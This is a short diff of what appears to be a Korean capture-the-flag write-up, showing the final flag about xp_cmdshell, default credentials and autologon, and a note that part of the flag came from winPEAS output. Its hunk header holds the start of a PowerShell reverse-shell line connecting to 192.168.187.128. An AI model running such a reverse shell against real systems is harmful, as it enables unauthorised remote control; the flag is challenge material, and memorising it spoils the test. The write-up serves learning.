@@ -135,4 +135,5 @@ $client = New-Object System.Net.Sockets.TCPClient("192.168.187.128",1433);$strea
 플래그의 3번째 파트는 winPEASOutput.txt 에 있다는 팀원 분의 도움을 받았ek.<br><br>
 
 그렇기에 최종 플래그는,<br>
-wctf{d0nt_3n4bl3_xP_cmdsh311_w1th_d3fault_cr3ds_0r_enabl3_4ut0log0n_0k??!?}
+wctf{d0nt_3n4bl3_xP_cmdsh311_w1th_d3fault_cr3ds_0r_enabl3_4ut0log0n_0k??!?}<br>
+이다.
